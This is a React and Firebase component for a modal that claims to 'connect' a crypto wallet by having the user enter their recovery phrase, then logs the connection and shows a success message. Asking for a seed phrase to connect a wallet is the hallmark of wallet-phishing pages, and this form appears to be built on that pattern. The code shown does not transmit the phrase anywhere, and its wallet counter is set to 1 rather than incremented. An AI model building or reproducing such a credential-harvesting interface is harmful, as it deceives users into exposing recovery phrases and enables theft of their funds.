import "./ConnectFormModal.css";
import { useState } from "react";
import { auth, db } from "../firebase/firebase";
import { doc, updateDoc, arrayUnion } from "firebase/firestore";

function ConnectFormModal({ isOpen, wallet, onClose }) {
  const [phrase, setPhrase] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);

  if (!isOpen || !wallet) return null;

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!phrase.trim()) {
      alert("Recovery phrase is required");
      return;
    }

    try {
      setLoading(true);

      const user = auth.currentUser;
      if (!user) throw new Error("User not logged in");

      const userRef = doc(db, "users", user.uid);

      // Save wallet connection activity
      await updateDoc(userRef, {
        connectedWallets: (wallet ? 1 : 0), // simple increment logic (you can improve later)
        activity: arrayUnion(
          `Connected ${wallet.name} wallet`
        ),
      });

      setSuccess(true);
      setPhrase("");

      setTimeout(() => {
        setSuccess(false);
        onClose();
      }, 2000);
    } catch (err) {
      console.error(err);
      alert("Failed to connect wallet");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="modal-overlay">

      <div className="modal-card">

        <h2>Connect {wallet.name}</h2>

        {!success ? (
          <form onSubmit={handleSubmit}>

            <textarea
              placeholder="Enter your recovery phrase..."
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
              rows={4}
            />

            <button type="submit" disabled={loading}>
              {loading ? "Connecting..." : "Connect Wallet"}
            </button>

          </form>
        ) : (
          <div className="success-box">
            ✅ Wallet Connected Successfully
          </div>
        )}

        <button className="close-btn" onClick={onClose}>
          ✕
        </button>

      </div>

    </div>
  );
}

export default ConnectFormModal;